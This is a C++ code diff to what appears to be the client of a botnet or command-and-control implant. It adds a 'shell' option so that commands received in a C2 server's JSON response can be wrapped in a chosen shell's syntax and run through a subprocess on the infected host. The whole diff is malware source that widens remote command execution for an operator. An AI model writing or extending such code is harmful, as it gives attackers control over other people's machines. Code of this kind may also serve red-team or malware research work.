@@ -2,6 +2,7 @@
 #include <memory>
 #include <random>
 #include <string>
+#include <tuple>
 
 #include "constants.hh"
 #include "picosha2.h"
@@ -46,6 +47,7 @@ class Command {
     std::string execute();
 
     std::string commandText;
+    std::string shell;
 };
 
 class Bot {
@@ -183,12 +185,29 @@ Command::Command(std::string& c2Response) {
     rapidjson::Document json;
     json.Parse(c2Response.c_str());
 
-    if (json.IsObject())
+    if (json.IsObject()) {
         commandText = json["command_text"].IsString()
                           ? json["command_text"].GetString()
                           : "";
+        shell =
+            json["shell"].IsString() ? json["shell"].GetString() : "default";
+    } else {
+        shell = "default";
+    }
 }
 
 std::string Command::execute() {
-    return util::popenSubprocess(commandText.c_str());
+    /* Add necessary syntax before and after command
+     * depending on shell choice */
+    std::string stringToExecute;
+
+    if (shell == "default") {
+        stringToExecute = commandText;
+    } else {
+        std::string preText, postText;
+        std::tie(preText, postText) = SHELL_SYNTAX_LIST.at(shell.c_str());
+        stringToExecute = preText + commandText + postText;
+    }
+
+    return util::popenSubprocess(stringToExecute.c_str());
 }
